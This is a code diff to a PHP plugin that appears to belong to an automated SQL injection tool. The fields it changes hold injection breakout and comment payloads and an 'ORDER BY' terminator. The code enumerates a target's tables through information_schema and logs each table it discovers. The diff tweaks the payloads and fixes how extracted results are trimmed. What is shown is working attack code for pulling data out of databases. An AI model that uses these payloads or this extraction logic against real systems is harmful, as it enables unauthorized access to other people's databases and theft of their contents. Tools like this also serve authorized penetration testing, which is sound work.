@@ -17,7 +17,7 @@
 			private	$_openTag						=	NULL;
 			private	$_closeTag						=	NULL;
 			private	$_fieldPayloads				=	array("","'", "%'","')","%')");
-			private	$_endingPayloads				=	array("ORDER BY 1");
+			private	$_endingPayloads				=	array("ORDER BY 1 DESC");
 			private	$_commentPayloads				=	array("/*","--","#");
 			private	$_currFieldPayload			=	NULL;
 			private	$_currTerminatingPayload	=	NULL;
@@ -25,7 +25,7 @@
 			private	$_getCompleteSchema			=	TRUE;
 			private	$_version						=	NULL;
 			private	$_strRepeat						=	100;
-			private	$_repeatCharacter				=	"1";
+			private	$_repeatCharacter				=	"NULL";
 
 			public function getPluginName(){
 				return self::PLUGIN_NAME;
@@ -402,13 +402,13 @@
 					$select									=	"TABLE_NAME";
 					$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
 
-					$this->_currTerminatingPayload	=	"ORDER BY 1 LIMIT ".$limit++.",1";
+					$this->_currTerminatingPayload	=	"ORDER BY 1 DESC LIMIT ".$limit++.",1";
 
 					while($table	=	$this->execute($select,$from)){
 
 						$this->log("Discovered table $table!",0,"light_purple");
 						
-						$restoreTPayLoad	=	$this->_currTerminatingPayload	=	"ORDER BY 1 LIMIT ".$limit++.",1";
+						$restoreTPayLoad	=	$this->_currTerminatingPayload	=	"ORDER BY 1 DESC LIMIT ".$limit++.",1";
 
 						//Add just the table to the table to the DatabaseSchema Object
 						//Columns are retrieved from the runner, this is just because some people
@@ -502,8 +502,10 @@
 
 			private function cleanUpResult($result){
 
-				$result	=	substr($result,$this->_strRepeat);
-				$result	=	substr($result,0,$this->_strRepeat*-1);
+				$length	=	strlen($this->_repeatCharacter);
+				$result	=	substr($result,$this->_strRepeat*$length);
+				$result	=	substr($result,0,($this->_strRepeat*$length)*-1);
+
 				return $result;
 
 			}
